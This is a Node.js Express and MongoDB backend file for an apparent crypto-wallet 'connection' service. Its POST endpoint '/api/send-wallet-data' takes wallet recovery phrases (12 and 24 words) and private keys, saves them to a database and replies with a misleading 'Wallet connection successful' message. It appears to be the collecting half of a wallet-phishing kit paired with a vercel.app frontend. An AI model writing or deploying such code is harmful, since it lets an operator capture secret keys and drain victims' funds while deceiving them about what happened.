const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Configure CORS
const allowedOrigins = ['https://theblockchain.vercel.app', 'http://localhost:5173'];

app.use(
  cors({
    origin: function(origin, callback) {
      if(!origin) return callback(null, true);
      if(allowedOrigins.indexOf(origin) === -1){
        var msg = 'The CORS policy for this site does not allow access from the specified Origin.';
        return callback(new Error(msg), false);
      }
      return callback(null, true);
    },
    credentials: true,
    methods: ["POST", "GET", "OPTIONS"],
    optionsSuccessStatus: 200,
  })
);

app.use(express.json());

// MongoDB connection
mongoose.connect(process.env.VITE_MONGO_URI)
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.log('MongoDB connection error:', err));

// Define a schema for wallet data
const walletSchema = new mongoose.Schema({
  walletName: String,
  walletAddress: String,
  phraseWords: [String],
  phraseWords24: [String],
  privateKey: String,
}, { timestamps: true });

const Wallet = mongoose.model('Wallet', walletSchema);

// Endpoint to handle wallet data
app.post('/api/send-wallet-data', async (req, res) => {
  const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } = req.body;

  try {
    const newWallet = new Wallet({
      walletName,
      walletAddress,
      phraseWords,
      phraseWords24,
      privateKey,
    });

    await newWallet.save();
    res.status(200).json({ message: 'Wallet connection successful' });
  } catch (error) {
    console.error('Error connecting wallet data:', error);
    res.status(500).json({ error: 'Error connecting wallet data', details: error.message });
  }
});

app.get('/', (req, res) => {
  res.send('Welcome to the Blockchain Backend API');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));